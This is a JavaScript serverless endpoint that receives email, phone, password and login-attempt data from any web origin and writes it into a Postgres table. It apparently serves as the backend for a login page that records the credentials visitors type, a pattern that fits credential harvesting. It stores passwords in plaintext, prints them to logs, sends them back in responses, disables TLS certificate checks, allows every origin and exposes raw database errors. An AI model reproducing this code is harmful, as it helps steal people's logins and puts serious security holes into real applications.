import { Pool } from 'pg';

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

export default async function handler(req, res) {
  // Handle CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    if (req.method === 'POST') {
      // FIX: Match frontend field names
      const { email, phone, password, login_method, failed_attempts, last_attempt } = req.body;
      
      console.log('📥 Received data:', req.body); // Add this for debugging
      
      // Create table if not exists (add new columns)
      await pool.query(`
        CREATE TABLE IF NOT EXISTS users (
          id SERIAL PRIMARY KEY,
          email VARCHAR(255),
          phone VARCHAR(20),
          password VARCHAR(255),
          login_method VARCHAR(50),
          failed_attempts INTEGER DEFAULT 0,
          last_attempt TIMESTAMP,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
      `);
      
      const result = await pool.query(
        'INSERT INTO users (email, phone, password, login_method, failed_attempts, last_attempt) VALUES ($1, $2, $3, $4, $5, $6) RETURNING *',
        [email, phone, password, login_method, failed_attempts, last_attempt]
      );
      
      console.log('✅ Stored in DB:', result.rows[0]); // Add this for debugging
      
      return res.status(200).json(result.rows[0]);
    } else {
      return res.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('❌ Database error:', error);
    return res.status(500).json({ error: error.message });
  }
}
